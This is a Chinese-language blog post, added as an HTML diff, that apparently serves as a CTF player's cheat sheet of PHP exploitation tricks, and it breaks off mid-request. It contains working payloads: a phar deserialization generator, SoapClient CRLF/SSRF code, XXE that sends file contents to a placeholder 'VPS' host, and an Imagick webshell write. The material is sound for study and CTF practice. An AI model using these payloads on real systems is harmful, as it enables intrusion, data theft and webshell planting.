@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon1.ico >
+    <title>
+        Squirt1e&#39;s blog
+    </title>
+    <meta name="description" content= 欢迎访问！ >
+    <meta name="keywords" content= Blog,Squirt1e >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            PHP的一些trick
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="PHP的一些trick"><a href="#PHP的一些trick" class="headerlink" title="PHP的一些trick"></a>PHP的一些trick</h1><blockquote>
+<p>会长期更新的系列，自用。</p>
+</blockquote>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="Magic-method"><a href="#Magic-method" class="headerlink" title="Magic method"></a>Magic method</h4><ul>
+<li>构造函数 <code>__construct</code> 对象被创建的时候调用</li>
+<li>析构函数 <code>__destruct</code> 对象被销毁的时候调用</li>
+<li>方法重载 <code>__call</code> 在对象中调用一个不可访问方法时调用</li>
+<li>方法重载 <code>__callStatic</code> 在静态上下文中调用一个不可访问方法时调用</li>
+<li>在给不可访问属性赋值时，<code>__set()</code> 会被调用。</li>
+<li>读取不可访问属性的值时，<code>__get()</code> 会被调用。</li>
+<li>当对不可访问属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用</li>
+<li>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用</li>
+<li><code>__sleep()</code> 在<code>serialize()</code> 函数执行之前调用</li>
+<li><code>__wakeup()</code> 在<code>unserialize()</code> 函数执行之前调用</li>
+<li><code>__toString</code> 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发</li>
+</ul>
+<h4 id="Primitive-class"><a href="#Primitive-class" class="headerlink" title="Primitive class"></a>Primitive class</h4><p><strong>读文件名：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token string">'/f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span>
+<span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>读文件：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h4><blockquote>
+<p>没有unserialize()时或许可以通过phar进行反序列化。</p>
+</blockquote>
+<p><strong>触发phar的函数：</strong></p>
+<table>
+<thead>
+<tr>
+<th>能够利用的函数</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>fileatime</td>
+<td>filectime</td>
+<td>file_exists</td>
+<td>file_get_contents</td>
+</tr>
+<tr>
+<td>file_put_contents</td>
+<td>file</td>
+<td>filegroup</td>
+<td>fopen</td>
+</tr>
+<tr>
+<td>fileinode</td>
+<td>filemtime</td>
+<td>fileowner</td>
+<td>fileperms</td>
+</tr>
+<tr>
+<td>is_dir</td>
+<td>is_executable</td>
+<td>is_file</td>
+<td>is_link</td>
+</tr>
+<tr>
+<td>is_readable</td>
+<td>is_writable</td>
+<td>is_writeable</td>
+<td>parse_ini_file</td>
+</tr>
+<tr>
+<td>copy</td>
+<td>unlink</td>
+<td>stat</td>
+<td>readfile</td>
+</tr>
+</tbody></table>
+<p><strong>利用phar的条件：</strong></p>
+<p>1）phar文件要能够上传至服务器</p>
+<p>2）要有可用的魔术方法为跳板</p>
+<p>3）文件操作函数的参数可控，且 : 、 &#x2F; 、phar等特殊字符没有被过滤</p>
+<p>4）php版本小于8</p>
+<p><strong>生成phar脚本：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
+
+<span class="token punctuation">}</span>
+ 
+<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>
+
+<span class="token punctuation">}</span>
+ 
+<span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>
+    
+<span class="token punctuation">}</span>
+
+@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成phar.phar</span>
+<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub，&lt;?php 前的字符无所谓，GIF89a绕过图片头</span>
+<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//写入metadata</span>
+<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//签名</span>
+<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="SoapClient-call-反序列化-CRLF打SSRF"><a href="#SoapClient-call-反序列化-CRLF打SSRF" class="headerlink" title="SoapClient::__call+反序列化+CRLF打SSRF"></a>SoapClient::__call+反序列化+CRLF打SSRF</h4><blockquote>
+<p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化，SoapClient打SSRF比较常见。</p>
+</blockquote>
+<p>首先测试下正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法，那么<code>__call</code>方法会POST一个本地请求从而绕过本机ip校验。</p>
+<p><strong>CRLF注入任意请求头：</strong></p>
+<p>用安洵杯的一道题做示范。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$target</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg";</span>
+<span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"123"</span><span class="token punctuation">,</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaaa\r\nCookie: PHPSESSID=123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"not_exists_function"</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>CRLF就是<code>\r\n</code>在HTTP报文中当换行用。user-agent注入Cookie成功。</p>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676533896472.png" style="zoom:80%;" />
+
+<h5 id="CRLF注入任意POST数据"><a href="#CRLF注入任意POST数据" class="headerlink" title="CRLF注入任意POST数据"></a>CRLF注入任意POST数据</h5><p>Content-Type不是可控的，但可以通过User-Agent伪造ContentType实现任意POST请求。</p>
+<p>注：Content-Length也需要注入。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/path';</span>
+<span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'data=something'</span><span class="token punctuation">;</span>
+<span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>
+    <span class="token string">'Cookie: PHPSESSID=123456'</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'Squirt1e^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^Content-Length: '</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string">'uri'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span>
+
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">not_exists_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="php-session"><a href="#php-session" class="headerlink" title="php session"></a>php session</h4><p>构造器的差异造成的反序列化。</p>
+<ul>
+<li>ini_set(‘session.serialize_handler’,’php_serialize’);</li>
+<li>ini_set(‘session.serialize_handler’,’php’);</li>
+</ul>
+<p>像这种就可控。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'baby'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'d0g3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+————————————————————————————————————————————————————————
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//$a=session_start  POST: serialize_handler=pphp_serialize</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对于php_serialize构造器，序列化数据前面要加个’|’。</p>
+<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535834714.png"></p>
+<p>然后使用php构造器就能反序列化了，因为php构造器分割键为’|’。</p>
+<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535938182.png"></p>
+<h3 id="可实例化类new-class-argv"><a href="#可实例化类new-class-argv" class="headerlink" title="可实例化类new $class($argv);"></a>可实例化类new $class($argv);</h3><p>如果仅仅是可实例化任意类，并且能接受参数，那么此时该如何利用呢？其实无非就是找自定义类、内置类或者扩展类。</p>
+<h4 id="自定义类"><a href="#自定义类" class="headerlink" title="自定义类"></a>自定义类</h4><p>实例化类时会触发构造函数，那么就会触发里面的代码。如果<code>xxx</code>为可以利用的函数，那么自然可以攻击。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// xxx</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>一般不会出现这样的情况，即便目标服务中有这样的恶意类，但可能由于没有<code>include</code>而无法调用。</p>
+<p>通过<code>php</code>中的自动加载函数可以找到全局自定义的类。因此利用面就从单个文件扩展到整个项目，前提是有注册回调<code>spl_autoload_register</code>或定义来设置的<code>__autoload</code>。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">include</span> <span class="token string">'./../classes/'</span> <span class="token punctuation">.</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">include</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="内置类"><a href="#内置类" class="headerlink" title="内置类"></a>内置类</h4><p>内置类很多，但如果只能传递一个参数并且不对创建的对象进行方法调用，那么就很难找到合适的内置类了。</p>
+<h5 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h5><p><code>SplFileObject</code>实现了一个允许连接到任何本地或远程 URL 的构造函数。可以通过该类实现SSRF。</p>
+<p><code>PHP &lt; 8</code> 中的 <code>SSRF</code> 可以通过 <code>Phar</code> 协议技术转化为反序列化。</p>
+<p>因此，满足以下条件即可：</p>
+<ol>
+<li>可上传文件，且路径已知。</li>
+<li>存在<code>pop</code>链</li>
+</ol>
+<h5 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h5><p>该类接收<code>3</code>个参数。</p>
+<p>通过设置第三个参数<code>dataIsURL</code>为<code> true</code>可以实现远程<code>xml</code>文件的加载。第二个参数的常量值设置为<code>2</code>即可。第一个参数 <code>data</code> 用于引入的外部实体的<code>url</code>。因此我们可以通过它打个XXE。</p>
+<p><strong>evil.xml</strong></p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE try[
+&lt;!ENTITY % remote SYSTEM "https://VPS/send.xml"></span>
+%remote;
+%all;
+%send;
+]>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>send.xml</strong></p>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
+&lt;!ENTITY % all "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'https://VPS/?%payload;'>">
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>也可以直接读文件，就不需要第三个参数了。</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=\"1.0\"?></span><span class="token doctype">&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM \"file:///etc/passwd\"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="扩展类"><a href="#扩展类" class="headerlink" title="扩展类"></a>扩展类</h4><h5 id="Magick"><a href="#Magick" class="headerlink" title="Magick"></a>Magick</h5><p><code>Imagick</code>拓展类是用于处理图像的，它是通过<code>Magick Scripting Language</code>语法来处理的。</p>
+<p>这个语法可以用来写、转移文件，难点在于它只支持图片格式，如果不是它支持的图片格式的话就报错。</p>
+<p>通过检索可知利用<code>ppm</code>图像文件格式的特点，可在末尾插入序列化数据而不影响图片的正常解析，这个东西就很妙。</p>
+<p>例如<code>SCTF 2023</code>的<code>fumo_backdoor</code>。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token string">":/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"FUNC_LIST"</span><span class="token punctuation">,</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>
+            <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> 
+            <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[flag]/m'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span>
+        <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>
+            <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> 
+            <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token constant">FUNC_LIST</span><span class="token punctuation">[</span><span class="token string">"internal"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">argv</span><span class="token punctuation">;</span>
+            <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">;</span>
+            
+            <span class="token keyword">new</span> <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">case</span> <span class="token string">'unserialze'</span><span class="token punctuation">:</span>
+        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">case</span> <span class="token string">'rm'</span><span class="token punctuation">:</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp 2>/dev/null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">default</span><span class="token punctuation">:</span>
+        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里如果<code>web</code>目录可写，我们可以直接写马。</p>
+<p>通过<code>vid</code>模式，我们可以包含未知名称的<code>MSL</code>格式的临时文件，从而触发<code>MSL</code>语法达到写的目的。</p>
+<pre class="line-numbers language-php"><code class="language-php">
+<span class="token delimiter">&lt;?php</span>
+<span class="token variable">$webshell</span> <span class="token operator">=</span> <span class="token string">"&lt;?php system('ls');?>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>数据包</strong></p>
+<pre class="line-numbers language-http"><code class="language-http">POST /?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1
+<span class="token header-name keyword">Host:</span> 127.0.0.1:18080
+<span class="token header-name keyword">Cache-Control:</span> max-age=0
+<span class="token header-name keyword">Content-Length:</span> 710
+<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979
+
